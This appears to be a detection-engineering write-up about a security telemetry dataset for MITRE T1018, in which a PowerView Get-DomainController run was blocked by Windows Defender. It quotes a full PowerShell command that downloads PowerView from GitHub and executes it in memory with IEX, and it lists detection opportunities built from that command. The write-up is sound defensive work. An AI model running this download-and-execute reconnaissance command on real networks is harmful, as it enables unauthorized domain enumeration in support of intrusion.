# T1018-19: Remote System Discovery — Get-DomainController with PowerView

## Technique Context

T1018 Remote System Discovery involves adversaries attempting to identify other systems on the network. The Get-DomainController function from PowerView (part of PowerSploit) is a popular Active Directory reconnaissance tool that queries domain controllers within the current domain. This technique is fundamental to lateral movement and privilege escalation phases, as identifying domain controllers provides attackers with high-value targets containing sensitive authentication data. Detection engineers focus on PowerShell script block logging, network queries to domain services, and the loading of PowerView modules since this technique generates distinctive PowerShell telemetry patterns.

## What This Dataset Contains

The dataset captures a PowerView execution that was blocked by Windows Defender. Security event 4688 shows the key command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose}`. The process (PID 0x1ce8) terminated with exit status `0xC0000022` (STATUS_ACCESS_DENIED), indicating Defender intervention.

Sysmon captures the process creation chain with event 1 showing whoami.exe execution, and multiple image load events (EID 7) documenting PowerShell's .NET framework loading including System.Management.Automation.ni.dll. Process access event (EID 10) shows PowerShell accessing the whoami process with full access rights (0x1FFFFF). A CreateRemoteThread event (EID 8) indicates process injection activity during the execution attempt.

The PowerShell channel contains only standard test framework boilerplate with Set-ExecutionPolicy and Set-StrictMode scriptblocks - no PowerView module loading or Get-DomainController execution is logged, confirming the technique was blocked before the malicious PowerShell content executed.

## What This Dataset Does Not Contain

The dataset lacks the actual PowerView module loading and Get-DomainController execution telemetry because Windows Defender blocked the technique. There are no PowerShell 4104 events showing the PowerView script content, no LDAP queries to domain controllers, no network connections to GitHub for the PowerView download, and no DNS queries for domain controller discovery. The absence of Sysmon network events (EID 3) and DNS events (EID 22) indicates the network download was prevented. Additionally, there's no evidence of successful Active Directory queries that would typically generate Windows Security events for LDAP operations.

## Assessment

This dataset provides excellent telemetry for detecting PowerView download and execution attempts, even when blocked by endpoint protection. The Security 4688 events with full command-line logging capture the complete attack chain including the GitHub URL and specific PowerView function call. The combination of Sysmon process creation, image loading, and process access events offers multiple detection vectors. However, the dataset's value is primarily in demonstrating blocked execution rather than successful technique telemetry, limiting its utility for understanding post-execution behaviors like actual domain controller enumeration patterns.

## Detection Opportunities Present in This Data

1. **PowerView Download Detection** - Monitor Security 4688 command lines for `IEX (IWR` patterns combined with PowerSploit GitHub URLs like `PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1`

2. **Get-DomainController Function Detection** - Alert on PowerShell command lines containing `Get-DomainController` with verbose flags, especially when combined with remote PowerShell module downloads

3. **Process Exit Status Monitoring** - Track Security 4689 events with exit status `0xC0000022` in PowerShell processes to identify blocked malicious executions

4. **PowerShell .NET Assembly Loading** - Monitor Sysmon EID 7 for System.Management.Automation.ni.dll loading patterns that precede AD reconnaissance activities

5. **PowerShell Process Injection Patterns** - Detect Sysmon EID 8 CreateRemoteThread events from PowerShell processes, especially when combined with suspicious command-line parameters

6. **PowerShell Security Protocol Changes** - Monitor for `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12` patterns that often precede malicious downloads
